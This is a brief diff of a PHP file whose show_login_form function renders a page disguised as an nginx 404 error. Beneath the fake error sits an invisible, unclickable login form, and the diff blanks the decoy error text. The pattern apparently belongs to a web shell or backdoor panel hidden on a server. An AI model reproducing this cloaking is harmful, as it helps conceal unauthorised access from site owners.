@@ -30,10 +30,10 @@ function show_login_form($error = '') {
     ?>
 <!DOCTYPE html>
 <html>
-<head><title>404 Not Found</title></head>
+<head><title></title></head>
 <body>
-<center><h1>404 Not Found</h1></center>
-<hr><center>nginx</center>
+<center><h1></h1></center>
+<hr><center></center>
 
 <!-- Form login tersembunyi -->
 <div style="position:fixed; bottom:0; right:0; opacity:0; pointer-events:none; z-index:-1;">
